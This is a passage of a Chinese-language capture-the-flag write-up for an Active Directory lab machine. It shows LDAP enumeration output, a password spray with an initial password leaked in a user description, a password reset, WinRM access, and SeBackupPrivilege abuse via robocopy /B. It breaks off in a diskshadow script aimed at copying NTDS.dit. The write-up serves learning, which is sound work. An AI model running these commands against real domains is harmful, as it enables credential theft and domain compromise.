LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20240727221156.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          it
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12845
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Remote Management Users,CN=Builtin,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           40986
LDAP        10.129.234.71   389    BABYDC           name                 it
LDAP        10.129.234.71   389    BABYDC           objectGUID           a9e7a710-6d75-d745-b650-269f8415b27c
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1109
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       it
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000001.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Connor Wilkinson
LDAP        10.129.234.71   389    BABYDC           sn                   Wilkinson
LDAP        10.129.234.71   389    BABYDC           givenName            Connor
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Connor Wilkinson
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12849
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12854
LDAP        10.129.234.71   389    BABYDC           name                 Connor Wilkinson
LDAP        10.129.234.71   389    BABYDC           objectGUID           0929b836-8c42-3c41-a99e-9964cd96a973
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810684117255
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1110
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Connor.Wilkinson
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Connor.Wilkinson@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Joseph Hughes
LDAP        10.129.234.71   389    BABYDC           sn                   Hughes
LDAP        10.129.234.71   389    BABYDC           givenName            Joseph
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Joseph Hughes
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12869
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12874
LDAP        10.129.234.71   389    BABYDC           name                 Joseph Hughes
LDAP        10.129.234.71   389    BABYDC           objectGUID           ae8d0e42-e958-d54f-8466-63528f5e5707
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810685992446
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1112
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Joseph.Hughes
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Joseph.Hughes@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Kerry Wilson
LDAP        10.129.234.71   389    BABYDC           sn                   Wilson
LDAP        10.129.234.71   389    BABYDC           givenName            Kerry
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Kerry Wilson
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12879
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12884
LDAP        10.129.234.71   389    BABYDC           name                 Kerry Wilson
LDAP        10.129.234.71   389    BABYDC           objectGUID           bd9dcde3-88f2-6a49-970a-572102271b6e
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810686929995
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1113
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Kerry.Wilson
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Kerry.Wilson@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Teresa Bell
LDAP        10.129.234.71   389    BABYDC           sn                   Bell
LDAP        10.129.234.71   389    BABYDC           description          Set initial password to BabyStart123!
LDAP        10.129.234.71   389    BABYDC           givenName            Teresa
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151437.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Teresa Bell
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12889
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12905
LDAP        10.129.234.71   389    BABYDC           name                 Teresa Bell
LDAP        10.129.234.71   389    BABYDC           objectGUID           1031975b-8263-804a-bbf8-6bb21c1bb741
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819812778759642
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1114
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Teresa.Bell
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Teresa.Bell@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           msDS-SupportedEncryptionTypes 0
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

一些条目的属性依旧不显示，因此可以判定，是权限问题导致的属性不输出。

而之前的 `--users` 之所以能枚举到合法用户，依据就是“某属性的某值”被代码写的正则所匹配。如果读不到对应的属性，则无法判定为合法用户，因而没有输出。

简单来说，我们可能错过了一些用户（没权限读属性，`--users` 缺少依据）。

Distinguised Name（DN）中的 cn 可能会有用户的信息，从上述输出中可以提取：

```bash
$cat out.txt | awk '{$1=$2=$3=$4=""; print $0}' | sed 's/^ *//' | grep -oP 'CN=[\w ]+' | awk '!seen[$0]++' | sed 's/CN=//'
Administrator
Users
Guest
Guests
Builtin
Person
Schema
Configuration
krbtgt
Domain Computers
Group
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Denied RODC Password Replication Group
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Allowed RODC Password Replication Group
Read
Enterprise Read
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
dev
Ian Walker
Leonard Dyer
Hugh George
Ashley Webb
Jacqueline Barnett
it
Caroline Robinson
Teresa Bell
Kerry Wilson
Joseph Hughes
Connor Wilkinson
Remote Management Users
```

> 为了方便提取，我在执行上述命令之前，先将之前 LDAP 查询的输出存到了 out.txt 文件当中。

但是 CN 中并不全是用户信息，可能包含：

- 内置账户
- 安全组
- 容器/Schema 对象
- 组织单元 OU
- 真实用户

真正需要的是“真实用户”这一部分，手工提取一下（看那些不是在描述功能的即可）：

```
Ian Walker
Leonard Dyer
Hugh George
Ashley Webb
Jacqueline Barnett
Caroline Robinson
Teresa Bell
Kerry Wilson
Joseph Hughes
Connor Wilkinson
```

为什么不提取“内置账户”呢？

原因：通常无效，而且会引入更多的噪声。对于这一部分通常采用额外的策略，而不是和普通用户一起。

根据之前通过 `--users` 看到的用户名，我们也将中间的空格给替换成 `.`，即：

```bash
$cat users.txt | sed 's/ /./'
Ian.Walker
Leonard.Dyer
Hugh.George
Ashley.Webb
Jacqueline.Barnett
Caroline.Robinson
Teresa.Bell
Kerry.Wilson
Joseph.Hughes
Connor.Wilkinson
```

这就作为我们的 user.txt。

现在就可以开始密码喷洒了：

```bash
$netexec ldap 10.129.234.71 -u users.txt -p 'BabyStart123!'
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123!
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123!
```

发现 Caroline.Robinson 用户的状态为：

```
STATUS_PASSWORD_MUST_CHANGE
```

也就是说，该用户目前依旧在使用初始密码，但需要再次登入时，会提示需要“更改密码”后才能登入。

NetExec 工具中有对应的更改密码的模块，但是需要指定为 smb 协议：

```bash
$netexec smb 10.129.234.71 -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS=zyf@zyf123.com
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
CHANGE-P... 10.129.234.71   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
```

提示更改密码成功了。

## 二、User Flag

拿到新的用户，重新开始枚举，依旧从 SMB 共享开始：

```bash
$netexec smb 10.129.234.71 -u 'Caroline.Robinson' -p 'zyf@zyf123.com' --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\Caroline.Robinson:zyf@zyf123.com
SMB         10.129.234.71   445    BABYDC           [*] Enumerated shares
SMB         10.129.234.71   445    BABYDC           Share           Permissions     Remark
SMB         10.129.234.71   445    BABYDC           -----           -----------     ------
SMB         10.129.234.71   445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.129.234.71   445    BABYDC           C$              READ,WRITE      Default share
SMB         10.129.234.71   445    BABYDC           IPC$            READ            Remote IPC
SMB         10.129.234.71   445    BABYDC           NETLOGON        READ            Logon server share
SMB         10.129.234.71   445    BABYDC           SYSVOL          READ            Logon server share
```

建立与 `$C` 共享的 SMB Session：

```bash
$smbclient //10.129.234.71/c$ -U 'Caroline.Robinson'%'zyf@zyf123.com'
Try "help" to get a list of possible commands.
smb: \> 
```

在该用户的桌面目录中，有 user flag，通过 get 命令下载到本地：

```bash
smb: \Users\Caroline.Robinson\Desktop\> get user.txt
getting file \Users\Caroline.Robinson\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

读取就得到了 User Flag：

```bash
$cat user.txt
a15f89**************************
```

## 三、Root Flag

### 1、WinRM

在之前的端口扫描中，可以发现开放了这么一个端口：

```
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

虽然指纹信息显示这是 http 服务，但是根据端口以及目标是 Windows，几乎可以判定这其实是 WinRM。

WinRM（Windows Remote Management），可以理解为 Windows 的远程管理协议栈。它常用于远程执行命令、远程 PowerShell、WMI 管理、事件转发、服务器运维自动化等场景。WinRM 是微软对 WS-Management（简写：WS-Man） 这个开放标准的实现。

WS-Man 这个开放标准，使用 SOAP/XML 格式的消息，通过 HTTP(S) 来传输管理操作。所以一个 WinRM 会话的真实样子是这样的层叠结构：

```
你敲的 PowerShell 命令 → PowerShell Remoting（PSRemoting）→ WS-Man 标准 → SOAP/XML 消息 → HTTP(S) → 端口 5985（HTTP）/ 5986（HTTPS）
```

简单来说，WinRM 把“管理 Windows 这件事”包装成 Web 服务的协议。你对一台机器下的每一条管理指令（重启、查进程、跑一段 PowerShell），在底层都变成了一个 HTTP 请求。

对 WinRM 最常用的工具是 `evil-winrm`，可以尝试用得到的凭证来获取远程 Powershell 执行：

```bash
$evil-winrm -i 10.129.234.71 -u 'Caroline.Robinson' -p 'zyf@zyf123.com'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

成功。说明此端口确实是 WinRM，并且凭证有效。而且，从抓到的流量上看，认证的方式采用的是 Negotiate：

![[file-20260604150236668.png]]

它会自动在 Kerberos 与 NTML 之间挑选（优先 Kerberos），但是由于我们提供的并不是票据，它就退化成了 NTLM。

简单浏览之后，就能发现 root.txt 的所在位置：

```powershell
*Evil-WinRM* PS C:\Users> tree /f .
Folder PATH listing
Volume serial number is 000001C3 7DCD:94E1
C:\USERS
+---Administrator
¦   +---3D Objects
¦   +---Contacts
¦   +---Desktop
¦   ¦       root.txt
¦   ¦
¦   +---Documents
¦   +---Downloads
¦   +---Favorites
¦   ¦   ¦   Bing.url
¦   ¦   ¦
¦   ¦   +---Links
¦   +---Links
¦   ¦       Desktop.lnk
¦   ¦       Downloads.lnk
¦   ¦
¦   +---Music
¦   +---Pictures
¦   +---Saved Games
¦   +---Searches
¦   +---Videos
+---Caroline.Robinson
¦   +---Desktop
¦   ¦       user.txt
¦   ¦
¦   +---Documents
¦   +---Downloads
¦   +---Favorites
¦   +---Links
¦   +---Music
¦   +---Pictures
¦   +---Saved Games
¦   +---Videos
+---Public
    +---Documents
    +---Downloads
    +---Music
    +---Pictures
    +---Videos
```

当然，目前只有列举的权限，并没有对文件的读取权限：

```powershell
*Evil-WinRM* PS C:\Users> type Administrator/Desktop/root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ type Administrator/Desktop/root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

需要横向或提权之后，才可能有读取的权限。

先看看当前账号的能力：

```powershell
*Evil-WinRM* PS C:\Users> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

有一个极高的权限：SeBackupPrivilege。

### 2、SeBackupPrivilege

#### （1）原理解析

SeBackupPrivilege 这个权限，可以绕过系统所有的文件访问控制列表（ACL）的限制，去读取电脑上的任何文件。

其实该权限本身只是一个文件备份权限，为什么能读取任意文件呢？

要理解这个，得知道 Windows 的访问控制有两道**独立**的门：

- 第一道门：DACL（每个文件自己的 ACL），讲述的是“你这个账户,对这个文件有没有读权限。”
- 第二道门：Access Token（访问令牌）上的 privilege（特权），即系统级的身份权利，跟具体哪个文件无关。

SeBackupPrivilege 属于第二道门。由于独立性，即使 ACL 上明令不允许你访问某该文件，但是只要你的 token 上描述的 privilege 允许你这么做，那么就不会被拒绝。

这就和警察办案差不多，你的私宅理论上别人不能私自进来（ACL），但是警察被赋予了“在办案中，依法对个人住宅展开调查”的权限（privilege），他们在依法办案时，就是能进入。（当然，这个例子的灵感源于电视剧，真实环境中我并不知晓）

而 SeBackupPrivilege 描述的能力就是：你可以对任何文件进行备份。

那么，“能否实现任意文件读取”就取决于你对备份文件的权限。

要知道，一个文件的 ACL，是和文件数据分开存储的元数据，读数据和读 ACL 是两个**独立**的操作。

那么，对文件进行备份的时候，大多数的工具只会读取数据而不去读取 ACL，这就意味着备份出来的副本会拿到一个全新的 ACL。

这个新的 ACL 会继承自父目录，并且将创建该副本的你设置为 Owner。

因此，只要在一个我们本来就具有读写权限的目录（`C:\Windows\Temp\`）作为备份文件的存放位置，我们就可以实现“任意文件读取”。

#### （2）目标确立

在利用之前 ，首先搞清楚目标是什么？

在 AD 中，敏感文件可以是：

- SAM：位置 `C:\Windows\System32\config\SAM`，这是本地用户密码的 NTLM 哈希
- SYSTEM：位置 `C:\Windows\System32\config\SYSTEM`，启动密钥
- SECURITY：位置 `C:\Windows\System32\config\SECURITY`，缓存的域凭证、LSA Secrets
- NTDS.dit：位置 `C:\Windows\NTDS\ntds.dit`，AD 中的数据库，包含整个域的所有用户、计算机、组和密码哈希

当然，在靶场中，甚至可以将目标限定于 root.txt。

#### （3）Root Flag

通过 robocopy 命令将 `root.txt` 备份至 `C:\Windows\Temp`：

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy C:\Users\Administrator\Desktop C:\Windows\Temp root.txt /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, June 4, 2026 8:01:33 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Windows\Temp\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Thursday, June 4, 2026 8:01:33 AM
```

> `/B` 参数会让 robocopy 进入 Backup mode，利用已启用的 SeBackupPrivilege 绕过 ACL 完成复制。

读取备份文件即可得到 root flag：

```powershell
type c:\Windows\Temp\root.txt
34b7d3***********************
```

#### （4）Beyond Flag

但是，作为学习目的，我们转移一下目标：NTDS.dit。

这个文件无法直接通过上述方法进行备份复制，因为在 AD 中的 DC 上，Active Directory Domain Services（NTDS 服务）持续持有该文件句柄并处于被读取状态。

常见的解决方法有两个：

1. Volume Shadow Copy
2. DiskShadow

先尝试第一种。

创建影卷副本：

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Error: You don't have the correct permissions to run this command.  Please run this utility from a command
window that has elevated administrator privileges.
```

权限直接阻止了这个操作。

尝试第二种方法。

先在攻击机上创建 diskshadow 脚本：

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% Z:
end backup
```

```bash
 $cat shadow.dsh
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% Z:
end backup
```

注意，Linux 的换行符和 Windows 上的换行符是不一样的，前者为 `\n` 后者为 `\r\n`。

通过 `sed` 命令添加一下 `\r`：

```bash
$sed -i 's/$/\r/' shadow.dsh
```

检验：

```bash
 $cat -A shadow.dsh
set verbose on^M$
set metadata C:\Windows\Temp\meta.cab^M$
set context clientaccessible^M$
set context persistent^M$
begin backup^M$
add volume C: alias cdrive^M$
create^M$
expose %cdrive% Z:^M$
end backup^M$
```

看到末尾是 `^M` 就成功了。

> `^M = Ctrl+M = ASCII 码 (77 - 64) = 13 = 0x0D = \r`

上传到目标上，`evil-winrm` 提供了很方便的文件操作命令：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> upload shadow.dsh

Info: Uploading /home/zyf/htb_workdir/baby/shadow.dsh to C:\Windows\Temp\shadow.dsh

Data: 252 bytes of 252 bytes copied

Info: Upload successful!
```

运行该脚本：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s C:\Windows\Temp\shadow.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  6/4/2026 8:57:11 AM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
The metadata file name path specifies a directory that is read-only.
```

很奇怪，提示 `C:\Windows\Temp` 这个目录“只读”，但是我命名可以写文件进去：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> echo 'test' > test.txt
*Evil-WinRM* PS C:\Windows\Temp> type test.txt
test
```

尝试自己新建一个目录：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> New-Item -ItemType Directory -Path C:\Temp -Force


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/4/2026   9:08 AM                Temp
```

重新修改脚本（这次直接在 `evil-winrm` 中操作）：

```powershell
Remove-Item C:\Windows\Temp\shadow.dsh -ErrorAction SilentlyContinue
Add-Content C:\Windows\Temp\shadow.dsh "set verbose on"
Add-Content C:\Windows\Temp\shadow.dsh "set metadata C:\Temp\meta.cab"
Add-Content C:\Windows\Temp\shadow.dsh "set context clientaccessible"
Add-Content C:\Windows\Temp\shadow.dsh "set context persistent"
Add-Content C:\Windows\Temp\shadow.dsh "begin backup"
Add-Content C:\Windows\Temp\shadow.dsh "add volume C: alias cdrive"
Add-Content C:\Windows\Temp\shadow.dsh "create"
